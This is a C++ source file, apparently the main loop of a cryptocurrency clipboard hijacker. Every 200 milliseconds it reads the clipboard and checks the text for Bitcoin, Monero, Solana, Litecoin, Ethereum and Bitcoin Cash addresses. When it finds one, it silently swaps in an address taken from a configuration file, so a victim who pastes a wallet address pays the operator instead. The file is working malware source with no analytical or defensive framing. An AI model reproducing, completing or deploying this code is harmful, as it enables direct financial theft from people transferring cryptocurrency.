#include "features/clipper/clipper.h"
#include "core/config.h"
#include <iostream>
#include <thread>
#include <algorithm>

static std::string ltrim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\n\r\f\v");
    return (start == std::string::npos) ? "" : s.substr(start);
}

static std::string rtrim(const std::string& s) {
    size_t end = s.find_last_not_of(" \t\n\r\f\v");
    return (end == std::string::npos) ? "" : s.substr(0, end + 1);
}

static inline std::string trim(const std::string& s) {
    return ltrim(rtrim(s));
}

int main()
{
    while (true)
    {
        std::string clipboard_text = clipper::get_clipboard_text();
        clipboard_text = trim(clipboard_text);
        crypto_type found = clipper::matches_regex(clipboard_text, crypto_regexes);
        
        if (found == bitcoin && config::bitcoin) {
            clipper::set_clipboard_text(config::bitcoin_addr);
            std::cout << "Bitcoin found.\n";
        }
        else if (found == monero && config::monero) {
            clipper::set_clipboard_text(config::monero_addr);
            std::cout << "Monero found.\n";
        }
        else if (found == solana && config::solana) {
            clipper::set_clipboard_text(config::solana_addr);
            std::cout << "Solana found.\n";
        }
        else if (found == litecoin && config::litecoin) {
            clipper::set_clipboard_text(config::litecoin_addr);
            std::cout << "Litecoin found.\n";
        }
        else if (found == ethereum && config::ethereum) {
            clipper::set_clipboard_text(config::ethereum_addr);
            std::cout << "Ethereum found.\n";
        }
        else if (found == bitcoin_cash && config::bitcoin_cash) {
            clipper::set_clipboard_text(config::bitcoin_cash_addr);
            std::cout << "Bitcoin cash found.\n";
        }
        else {
            std::cout << "No currency found.\n";
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}